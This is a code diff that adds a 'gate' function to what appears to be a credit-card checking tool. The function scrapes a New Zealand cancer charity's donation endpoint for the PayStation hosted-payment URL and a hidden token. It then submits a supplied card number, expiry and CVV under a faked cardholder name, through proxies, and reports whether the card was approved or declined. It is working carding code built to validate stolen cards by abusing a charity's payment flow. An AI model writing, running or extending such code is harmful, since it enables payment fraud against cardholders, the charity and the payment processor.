@@ -572,6 +572,88 @@ def test_proxy_connectivity(proxy_str):
     return False, 0, last_error
 
 
+def check_cc_stc(cc_number, month, year, cvv, proxies=None):
+    """STC gate — PayStation NZ payment gateway auth."""
+    start_time = time.time()
+    session = requests.Session()
+    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
+
+    try:
+        # Step 1: Get a hosted session from the merchant
+        merchant_url = 'https://www.cancer.org.nz/paymentendpoint/'
+        resp1 = session.get(merchant_url, headers={'User-Agent': ua}, proxies=proxies, timeout=15, allow_redirects=True)
+
+        # Extract PayStation hosted page URL or session ID
+        ps_match = re.search(r'https://payments\.paystation\.co\.nz/hosted/?\?[^"\'>\s]+', resp1.text)
+        if not ps_match:
+            # Try to find a form action or redirect
+            ps_match = re.search(r'action=["\']?(https://payments\.paystation\.co\.nz[^"\'>\s]*)', resp1.text)
+        
+        if ps_match:
+            hosted_url = ps_match.group(0).rstrip('"\'>')
+            resp2 = session.get(hosted_url, headers={'User-Agent': ua}, proxies=proxies, timeout=15)
+        else:
+            resp2 = resp1
+
+        # Extract hidden fields (hk, etc.)
+        hk_match = re.search(r'name=["\']?hk["\']?\s+value=["\']?([^"\'>\s]+)', resp2.text)
+        hk = hk_match.group(1) if hk_match else ''
+
+        # Format expiry as MMYY
+        exp_mm = month.zfill(2)
+        exp_yy = year[-2:] if len(year) == 4 else year.zfill(2)
+        card_expiry = f"{exp_mm}{exp_yy}"
+
+        # Generate card holder name
+        if faker:
+            card_name = faker.name()
+        else:
+            card_name = f"John Smith"
+
+        # Step 2: Submit to PayStation ajax endpoint
+        ajax_url = 'https://payments.paystation.co.nz/hosted/ajax.php'
+        headers = {
+            'User-Agent': ua,
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Pragma': 'no-cache',
+            'Accept': '*/*',
+        }
+
+        data = {
+            'card_number': cc_number,
+            'card_security': cvv,
+            'card_expiry': card_expiry,
+            'card_name': card_name,
+            'verified': 'null',
+        }
+        if hk:
+            data['hk'] = hk
+
+        resp3 = session.post(ajax_url, headers=headers, data=data, proxies=proxies, timeout=20)
+        process_time = round(time.time() - start_time, 2)
+
+        if resp3.status_code == 200:
+            try:
+                rj = resp3.json()
+                successful = rj.get('successful', False)
+                error_code = str(rj.get('error_code', ''))
+                error_msg = rj.get('error_message', '')
+
+                if successful or error_code == '0':
+                    return f"Approved | {error_msg} ({process_time}s)"
+                else:
+                    return f"Declined | [{error_code}] {error_msg} ({process_time}s)"
+            except Exception:
+                text_lower = resp3.text.lower()
+                if 'successful' in text_lower and 'true' in text_lower:
+                    return f"Approved | {resp3.text[:100]} ({process_time}s)"
+                return f"Declined | {resp3.text[:100]} ({process_time}s)"
+        else:
+            return f"Declined | HTTP {resp3.status_code} ({process_time}s)"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
 def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
     """Auth2 gate — uses stripe.stormx.pw autostripe endpoint."""
     start_time = time.time()
